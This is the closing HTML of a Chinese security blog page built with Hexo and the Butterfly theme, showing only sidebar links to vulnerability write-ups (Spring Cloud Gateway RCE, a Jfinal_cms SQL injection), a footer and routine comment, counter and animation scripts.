rce"/></a><div class="content"><a class="title" href="/2022/03/30/%E3%80%90cve-2022-22947%E3%80%91Spring-Cloud-Gateway-rce/" title="【CVE-2022-22947】Spring Cloud Gateway rce">【CVE-2022-22947】Spring Cloud Gateway rce</a><time datetime="2022-03-30T07:12:56.000Z" title="发表于 2022-03-30 15:12:56">2022-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/29/Jfinal-cms-sql-%E6%B3%A8%E5%85%A5/" title="Jfinal_cms sql 注入"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Jfinal_cms sql 注入"/></a><div class="content"><a class="title" href="/2022/03/29/Jfinal-cms-sql-%E6%B3%A8%E5%85%A5/" title="Jfinal_cms sql 注入">Jfinal_cms sql 注入</a><time datetime="2022-03-29T09:17:24.000Z" title="发表于 2022-03-29 17:17:24">2022-03-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/29/Spring-Cloud-Function-SPEL-RCE/" title="Spring-Cloud-Function-SPEL-RCE"><img src="https://s2.loli.net/2022/03/29/jRfHqVMmJh65eUd.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring-Cloud-Function-SPEL-RCE"/></a><div class="content"><a class="title" href="/2022/03/29/Spring-Cloud-Function-SPEL-RCE/" title="Spring-Cloud-Function-SPEL-RCE">Spring-Cloud-Function-SPEL-RCE</a><time datetime="2022-03-29T09:17:01.000Z" title="发表于 2022-03-29 17:17:01">2022-03-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Nice</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎来到我的博客</div><img src="/images/beian.png" style="vertical-align: text-bottom;">
<a href="http://beian.miit.gov.cn/" style="text-align:center;color:#f8f8ff" target="_blank" rel="nofollow">蜀ICP备2021007655号-1</a></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>(()=>{
  const $countDom = document.getElementById('twikoo-count')
  const init = () => {
    let initData = {
      el: '#twikoo-wrap',
      envId: 'niceblog-8g99u80g7cfc5755',
      region: 'ap-shanghai'
    }

    if (false) {
      const otherData = false
      initData = Object.assign(initData, otherData)
    }
    
    twikoo.init(initData)
  }

  const getCount = () => {
    twikoo.getCommentsCount({
      envId: 'niceblog-8g99u80g7cfc5755',
      region: 'ap-shanghai',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      $countDom.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const loadTwikoo = (bool = false) => {
    if (typeof twikoo === 'object') {
      init()
      bool && $countDom && setTimeout(getCount,0)
    } else {
      getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(()=> {
        init()
        bool && $countDom && setTimeout(getCount,0)
      })
    }
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo(true)
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="190,190,190" opacity="0.5" zIndex="-1" count="222" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>